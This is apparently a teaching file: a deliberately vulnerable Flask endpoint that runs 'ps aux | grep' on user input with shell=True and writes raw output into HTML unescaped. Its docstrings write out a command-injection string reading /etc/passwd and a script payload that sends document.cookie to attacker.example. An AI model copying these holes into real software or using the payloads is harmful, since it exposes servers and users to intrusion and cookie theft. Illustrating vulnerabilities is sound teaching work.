# Write insecure code to monitor CPU and memory usage that unsafely calls system diagnostic tools and prints their raw, unfiltered output to the browser 

"""
insecure_monitor_example.py
-----------------------------
*** DO NOT USE THIS CODE. ***

This file exists purely to illustrate two classic vulnerabilities
stacked together, as a contrast to how a system-monitoring endpoint
should actually be built:

  1. OS command injection: a user-supplied filter value is concatenated
     into a shell command string and executed with shell=True.
  2. Reflected/stored XSS + information disclosure: the raw, unfiltered
     stdout of a system diagnostic tool is written directly into an
     HTML response with no escaping and no restriction on what that
     output could contain — including injected script tags, and
     including sensitive system details (usernames, process paths,
     internal IPs) exposed to any browser that requests the page.

Requires `flask` to actually run (`pip install flask`), but the
vulnerability is illustrated in the code regardless of whether you run it.
"""

import subprocess

from flask import Flask, request

app = Flask(__name__)


@app.route("/monitor")
def monitor_INSECURE():
    """
    VULNERABLE endpoint: /monitor?filter=<anything>

    Example attack (command injection):
        GET /monitor?filter=firefox; cat /etc/passwd
        -> the shell command becomes:
             ps aux | grep firefox; cat /etc/passwd
           and the attacker now sees the server's /etc/passwd contents
           reflected right back in the HTTP response.

    Example attack (XSS, layered on top):
        GET /monitor?filter=<script>fetch('//attacker.example/steal?c='+document.cookie)</script>
        -> that string flows into the shell command (likely erroring out
           or matching nothing), but ALSO gets echoed back unescaped
           inside the HTML page, so if the app ever also reflects the
           raw filter value (a very common pattern next to this kind of
           code), it executes in the victim's browser and can exfiltrate
           session cookies.
    """
    filter_value = request.args.get("filter", "")

    # DANGER #1: untrusted input concatenated into a shell command string
    command = f"ps aux | grep {filter_value}"
    # DANGER: shell=True interprets ; & | ` $() > etc. in filter_value
    output = subprocess.run(command, shell=True, capture_output=True, text=True).stdout

    # DANGER #2: raw command output (and implicitly, anything an
    # attacker smuggled into it) written straight into HTML with zero
    # escaping. Any "<script>" that ends up in `output` — whether from
    # a maliciously named process or a crafted filter — executes in
    # every browser that loads this page.
    html = f"""
    <html>
      <body>
        <h1>Process Monitor</h1>
        <pre>{output}</pre>
      </body>
    </html>
    """
    return html


if __name__ == "__main__":
    print("This is an illustrative vulnerable example — do not run in a real environment.")
    print("Example attack URL: /monitor?filter=x;cat%20/etc/passwd")